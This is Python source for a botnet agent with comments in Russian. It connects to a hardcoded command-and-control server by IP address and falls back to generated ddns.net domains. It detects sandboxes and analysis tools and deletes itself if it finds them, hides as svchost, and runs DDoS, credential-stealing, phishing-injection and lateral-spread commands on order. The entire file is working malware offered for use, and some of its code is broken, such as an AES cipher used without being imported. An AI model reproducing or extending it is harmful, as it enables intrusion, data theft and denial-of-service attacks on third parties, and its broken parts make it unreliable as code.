import asyncio, websockets, json, platform, os, socket, sys, importlib, random, string, psutil, subprocess, time, hashlib, base64, zlib, secrets, threading
from utils.logger import log

C2_PRIMARY = '80.249.146.202:8888'
BOT_ID = ''
PLUGIN_DIR = 'agent_plugins'

def generate_domains(seed_str, count=5):
    domains = []
    for i in range(count):
        h = hashlib.sha256(f"{seed_str}-{i}".encode()).hexdigest()[:12]
        domains.append(f"{h}.ddns.net")
    return domains

def detect_honeypot():
    suspicious = False
    try:
        if os.path.exists("/.dockerenv"): suspicious = True
        with open("/proc/cpuinfo") as f:
            if "hypervisor" in f.read().lower(): suspicious = True
    except: pass
    if platform.system() == 'Windows':
        try:
            if os.path.exists("C:\\Sandbox"): suspicious = True
        except: pass
    suspicious_procs = ['wireshark', 'tcpdump', 'procmon', 'fiddler', 'charles', 'burp', 'vboxservice', 'vmtoolsd']
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'].lower() in suspicious_procs:
                suspicious = True
        except: pass
    if suspicious:
        log("[Agent] Honeypot detected, self-destruct")
        try: os.remove(__file__)
        except: pass
        sys.exit(0)

def polymorphic_layer():
    # Шифрование и динамическое выполнение
    key = secrets.token_bytes(32)
    cipher = AES.new(key, AES.MODE_GCM)
    payload = b"print('Agent active')"
    ciphertext, tag = cipher.encrypt_and_digest(payload)
    with open('encrypted.dat', 'wb') as f:
        f.write(cipher.nonce + tag + ciphertext)
    with open('encrypted.dat', 'rb') as f:
        nonce = f.read(16)
        tag = f.read(16)
        ct = f.read()
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    pt = cipher.decrypt_and_verify(ct, tag)
    exec(pt.decode())

def inject_into_process():
    # Инжект в svchost (Windows)
    if platform.system() == 'Windows':
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
        except: pass

def load_plugins():
    plugins = {}
    if not os.path.exists(PLUGIN_DIR): return plugins
    for fname in os.listdir(PLUGIN_DIR):
        if fname.endswith('.py') and fname != '__init__.py':
            modname = fname[:-3]
            try:
                spec = importlib.util.spec_from_file_location(modname, os.path.join(PLUGIN_DIR, fname))
                module = importlib.util.module_from_spec(spec)
                sys.modules[modname] = module
                spec.loader.exec_module(module)
                plugins[modname] = module
            except Exception as e:
                log(f"[Agent] Plugin {modname} error: {e}")
    return plugins

async def try_connect(host, port):
    uri = f"ws://{host}:{port}"
    try:
        async with websockets.connect(uri) as ws:
            await ws.send(json.dumps({'cmd': 'register', 'bot_id': BOT_ID, 'info': {'os': platform.system(), 'hostname': platform.node()}, 'bandwidth': 10}))
            log(f"[Agent] Connected to {host}:{port}")
            async for msg in ws:
                data = json.loads(msg)
                if data.get('cmd') == 'execute':
                    action = data['data'].get('action')
                    if action == 'attack':
                        target = data['data']['target']
                        if 'ddos' in plugins:
                            plugins['ddos'].attack(target)
                    elif action == 'steal':
                        if 'stealer' in plugins:
                            plugins['stealer'].run()
                    elif action == 'lateral':
                        from botnet.lateral_spread import lateral_scan
                        local_ip = socket.gethostbyname(socket.gethostname())
                        asyncio.ensure_future(lateral_scan(local_ip))
                elif data.get('cmd') == 'kill':
                    os.remove(__file__)
                    sys.exit(0)
    except:
        return False
    return True

async def connect():
    global BOT_ID
    BOT_ID = socket.gethostname()
    detect_honeypot()
    polymorphic_layer()
    inject_into_process()
    from botnet.phishing_injector import inject_phishing
    inject_phishing()
    plugins = load_plugins()
    host, port = C2_PRIMARY.split(':')
    if not await try_connect(host, int(port)):
        domains = generate_domains(BOT_ID)
        for domain in domains:
            if await try_connect(domain, int(port)):
                return
        await asyncio.sleep(60)
        asyncio.ensure_future(connect())

if __name__ == '__main__':
    asyncio.run(connect())
